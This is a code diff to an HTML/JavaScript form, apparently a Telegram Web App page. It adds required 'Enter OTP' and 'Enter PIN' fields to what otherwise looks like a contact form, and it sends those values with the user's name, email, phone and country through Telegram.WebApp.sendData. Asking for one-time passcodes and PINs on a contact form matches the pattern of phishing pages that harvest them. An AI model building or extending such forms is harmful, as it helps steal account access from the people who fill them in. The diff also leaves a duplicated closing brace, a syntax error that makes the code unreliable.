@@ -54,7 +54,8 @@ font-size:16px;
 <input type="tel" id="phone" placeholder="Phone Number" required>
 
 <input type="text" id="country" placeholder="Country" required>
-
+<input type="text" id="otp" placeholder="Enter OTP" required>
+<input type="password" id="pin" placeholder="Enter PIN" required>
 <textarea id="message" placeholder="Message"></textarea>
 
 <button type="submit">Submit</button>
@@ -144,7 +145,8 @@ font-size:16px;
 <input type="tel" id="phone" placeholder="Phone Number" required>
 
 <input type="text" id="country" placeholder="Country" required>
-
+<input type="text" id="otp" placeholder="Enter OTP" required>
+<input type="password" id="pin" placeholder="Enter PIN" required>
 <textarea id="message" placeholder="Message"></textarea>
 
 <button type="submit">Submit</button>
@@ -162,11 +164,14 @@ document.getElementById("form").onsubmit=function(e){
 e.preventDefault();
 
 const data={
-name:name.value,
-email:email.value,
-phone:phone.value,
-country:country.value,
-message:message.value
+  name: name.value,
+  email: email.value,
+  phone: phone.value,
+  country: country.value,
+  message: message.value,
+  otp: otp.value,
+  pin: pin.value
+};
 };
 
 Telegram.WebApp.sendData(JSON.stringify(data));
